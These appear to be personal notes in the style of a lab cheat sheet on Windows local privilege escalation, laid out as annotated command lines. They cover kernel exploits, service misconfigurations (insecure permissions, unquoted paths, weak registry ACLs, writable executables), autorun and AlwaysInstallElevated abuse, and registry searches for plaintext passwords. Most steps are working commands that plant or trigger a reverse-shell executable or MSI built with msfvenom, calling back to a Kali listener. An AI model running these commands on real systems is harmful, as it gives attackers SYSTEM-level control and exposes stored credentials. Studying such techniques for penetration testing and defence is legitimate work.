-------------------- Kernel Exploit --------------------

> systeminfo > \\ip\sharename\systeminfo.txt                                                               ---> to send it to kali in smb share

> python widowsexploitsuggester.py systeminfo.txt -i 'Elevationof Privilege' --exploits-only | more        ---> search for kernel exploit using windows exploit suggester

> .\kernelexploit.exe C:\PrivEsc\reverse.exe                                                               ---> run exploit which reverse created using msfveom


-------------------- Service Exploits --------------------


1---- Insecure Service Permissions ----
If the user have a permision to change the configuterion of service run with system privileges, then We can change the executblel file for this servcie,and stop/start the service to be able to escalte our privileges.

> .\winPEASany.exe quiet servicesinfo                                                                     ---> Run winPEAS to check for service misconfigurations
> .\accesschk.exe /accepteula -uwcqv "currentuser" "servicename"                                          ---> confirm if we can edit the service conf with accesschk.exe
> sc qc servicename                                                                                       ---> Check the current configuration of the service
> sc query servicename                                                                                    ---> Check the current status of the service
> sc config servicename binpath= "\"C:\PrivEsc\reverse.exe\""                                             ---> Reconfigure the service to use our reverse shell executable
> net start servicename                                                                                   ---> Start a listener on Kali, and then restart the service

2---- Unquoted Service Path ----
If the path to the service binary is not enclosed in quotes and contains white spaces.If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.

> .\winPEASany.exe quiet servicesinfo                                                                     ---> Run winPEAS to check for service misconfigurations

Note that the “unquotedsvc” service has an unquoted path that also contains spaces: C:\Program Files\Unquoted Path Service\CommonFiles\unquotedpathservice.exe   

> sc qc unquotedsvc                                                                                       ---> Confirm this using sc
> .\accesschk.exe /accepteula -uwdq C:\                                                                   ---> Use accesschk.exe to check for write permissions
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"                                                   ---> Use accesschk.exe to check for write permissions
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"                             ---> Use accesschk.exe to check for write permissions 
> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"                         ---> Copy the reverse shell executable and rename it as in the path
> net start unquotedsvc                                                                                   ---> Start a listener on Kali, and then restart the service


3---- Weak Registry Permissions ----

The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.

> .\winPEASany.exe quiet servicesinfo                                                                                   ---> Run winPEAS to check for service misconfigurations
> PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List                                              ---> Note that the “regsvc” service has a weak registry entry. We can confirm this with PowerShell
> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc                                      --->  accesschk.exe can be used to confirm
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f      ---> Overwrite the ImagePath registry key to point to our reverse shell executable
> net start regsvc                                                                                                      ---> Start a listener on Kali, and then restart the service


4---- Insecure Service Executables ----
If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable.

> .\winPEASany.exe quiet servicesinfo                                                                     ---> Run winPEAS to check for service misconfigurations
> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"       ---> Confirm this with accesschk.exe that filepermservice.exe writable by everyone
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"          ---> Copy the reverse shell executable to overwrite the service executable
> net start filepermsvc                                                                                  ---> Start a listener on Kali, and then restart the service


5---- DLL Hijacking ----
Often a service will try to load functionality from a library called a DLL (dynamic-link library).Tthe DLL will be executed with the same privileges as the service that loaded it.a DLL is loaded with an absolute path, it might be possible.

> .\winPEASany.exe quiet servicesinfo                                                                                   ---> Run winPEAS to enumerate non-Windows services
> .\accesschk.exe /accepteula -uvqc user dllsvc                                                                         ---> Neeed Foucus 



-------------------- Registary --------------------

1---- Exploiting Autorun ----
Windows allows users to set specific programs to automatically start whenever the system boots, the list of programs that have this functionality enabled is stored in the Windows Registry.The Autorun programs are usually stored in the Run or RunOnce registry keys 

> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run                                                          ---> Enumerate the AutoRun manullay executables
> Accesschk.exe -accepteula -wuqv "C:\Program Files\Autorun Program\program.exe"                                        ---> Use accesschk.exe to verify the permissions on each one
> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp                                                           ---> Create a backup of the original
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe                                          ---> Copy our reverse shell executable to overwrite the AutoRun executable

2----AlwaysInstallElevated ----

> .\winPEASany.exe quiet windowscreds                                                                                   ---> Use winPEAS to see if both registry values are set.
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated                                 ---> verify to see if both registry values are set manually
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated                                 ---> verify to see if both registry values are set manually
$ msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f msi -o reverse.msi                                             ---> Create a reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension
> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi                                                                          ---> start a listener on Kali, and run the installer to trigger the exploit
explain the switches:
/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation

-------------------- Passwords --------------------
Windows itself sometimes will store passwords in plaintext in the Registry.

> reg query HKLM /f password /t REG_SZ /s
> reg query HKCU /f password /t REG_SZ /s










